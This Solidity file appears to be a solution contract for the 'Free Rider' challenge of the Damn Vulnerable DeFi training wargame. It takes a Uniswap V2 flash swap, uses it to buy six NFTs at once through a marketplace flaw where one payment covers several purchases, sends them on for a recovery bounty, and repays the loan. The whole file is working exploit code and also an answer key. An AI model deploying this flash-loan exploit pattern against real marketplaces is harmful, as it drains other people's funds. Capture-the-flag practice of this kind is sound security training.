// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solmate/src/tokens/ERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface WETH9 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    uint256 private constant NFT_PRICE = 15 ether;

    address private _pair;
    ERC20 private _token;
    ERC20 private _weth;
    FreeRiderNFTMarketplace private _marketplace;
    DamnValuableNFT private _nft;
    FreeRiderRecovery private _devsContract;
    address private _player;

    constructor(address pair, ERC20 token, ERC20 weth, FreeRiderNFTMarketplace marketplace, DamnValuableNFT nft, FreeRiderRecovery devsContract) {
        _pair = pair;
        _token = token;
        _weth = weth;
        _marketplace = marketplace;
        _nft = nft;
        _devsContract = devsContract;
        _player = msg.sender;
    }

    function attack() external payable {
        IUniswapV2Pair(_pair).swap(NFT_PRICE, 0, address(this), "0x0");
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        WETH9(address(_weth)).withdraw(NFT_PRICE);
        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;

        _marketplace.buyMany{value: NFT_PRICE}(tokenIds);
        bytes memory data = abi.encode(_player);
        for (uint256 i = 0; i < 6; i++) {
            _nft.safeTransferFrom(address(this), address(_devsContract), tokenIds[i], data);
        }

        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
        WETH9(address(_weth)).deposit{value: amountToPayBack}();
        _weth.transfer(address(_pair), amountToPayBack);
    }

    receive() external payable {}

        function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}
